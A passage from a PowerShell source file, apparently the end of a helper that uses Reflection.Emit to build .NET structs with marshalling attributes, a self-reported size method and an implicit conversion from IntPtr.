        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}
